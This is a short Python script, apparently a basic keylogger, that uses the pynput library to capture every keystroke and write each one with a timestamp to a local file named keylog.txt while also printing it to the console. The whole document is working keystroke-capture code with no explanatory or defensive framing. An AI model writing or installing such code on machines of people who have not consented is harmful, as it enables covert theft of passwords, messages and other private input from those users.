from pynput.keyboard import Listener
import logging

logging.basicConfig(filename=("path to/keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def on_press(key):
    logging.info(str(key))
    print(f"Pressed key: {key}")

with Listener(on_press=on_press) as listener:
    listener.join()
